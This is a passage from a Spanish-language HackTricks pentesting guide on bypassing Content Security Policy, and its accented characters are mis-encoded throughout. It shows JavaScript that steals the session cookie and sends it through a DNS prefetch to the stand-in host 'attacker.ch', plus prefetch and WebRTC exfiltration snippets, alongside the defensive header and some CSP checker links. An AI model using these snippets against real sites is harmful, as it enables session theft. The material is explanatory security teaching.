Para cargar p√°ginas m√°s r√°pido, los navegadores resuelven previamente los nombres de host en direcciones IP y los almacenan en cach√© para su uso posterior.\
Puede indicar a un navegador que resuelva previamente un nombre de host con: `<link reol="dns-prefetch" href="something.com">`

Podr√≠a abusar de este comportamiento para **filtrar informaci√≥n sensible a trav√©s de solicitudes DNS**:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```
Otra forma:
```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```
Para evitar que esto suceda, el servidor puede enviar el encabezado HTTP:
```
X-DNS-Prefetch-Control: off
```
{% hint style="info" %}
Aparentemente, esta t√©cnica no funciona en navegadores sin cabeza (bots)
{% endhint %}

### WebRTC

En varias p√°ginas se puede leer que **WebRTC no verifica la pol√≠tica `connect-src`** del CSP.
```javascript
var pc = new RTCPeerConnection({"iceServers":[{"urls":["turn:74.125.140.127:19305?transport=udp"],"username":"_all_your_data_belongs_to_us","credential":"."}]});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp));
```
Sin embargo, parece que ya no es [posible](https://github.com/w3c/webrtc-nv-use-cases/issues/35) (o al menos no tan f√°cil).

Si sabes c√≥mo exfiltrar informaci√≥n con WebRTC, [**por favor env√≠a una solicitud de extracci√≥n**](https://github.com/carlospolop/hacktricks)

## Verificaci√≥n de las pol√≠ticas CSP en l√≠nea

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## Creaci√≥n autom√°tica de CSP

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## Referencias

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)

‚Äã

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Sigue a HackenProof**](https://bit.ly/3xrrDrL) **para aprender m√°s sobre errores web3**

üêû Lee tutoriales sobre errores web3

üîî Recibe notificaciones sobre nuevos programas de recompensas por errores

üí¨ Participa en discusiones comunitarias

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando solicitudes de extracci√≥n al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
